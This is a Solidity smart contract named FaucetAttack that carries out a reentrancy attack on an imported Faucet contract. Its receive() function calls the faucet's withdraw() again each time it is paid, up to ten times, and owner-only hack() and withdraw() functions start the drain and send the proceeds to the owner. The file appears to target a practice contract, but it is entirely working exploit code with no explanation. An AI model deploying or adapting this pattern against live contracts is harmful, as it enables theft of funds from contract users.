// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/access/Ownable.sol';
import './Faucet.sol';

contract FaucetAttack is Ownable {
    Faucet public faucet;
    uint8 i;

    constructor(address faucet_) {
        i = 1;
        faucet = Faucet(faucet_);
        faucet.register(address(this));
    }

    receive() external payable {
        if (i != 10) {
            i += 1;
            faucet.withdraw();
        }
    }

    function withdraw() external onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }

    function hack() external onlyOwner {
        faucet.withdraw();
    }
}